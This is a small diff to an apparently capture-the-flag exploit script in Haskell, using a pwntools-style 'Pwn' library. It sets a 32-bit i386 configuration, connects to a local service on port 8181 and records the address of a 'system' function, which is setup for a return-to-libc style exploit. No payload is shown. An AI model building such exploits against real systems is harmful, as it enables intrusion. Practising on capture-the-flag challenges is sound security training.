@@ -7,8 +7,10 @@ import           Data.Monoid           ((<>))
 import           Numeric               (showHex)
 import           Pwn
 
+cfg = defaultConfig { arch = "i386", bits = 32 }
+
 main :: IO ()
-main = do
+main = pwnWith cfg $ do
   r <- remote "0.0.0.0" 8181
 
   let system = 0x8048620
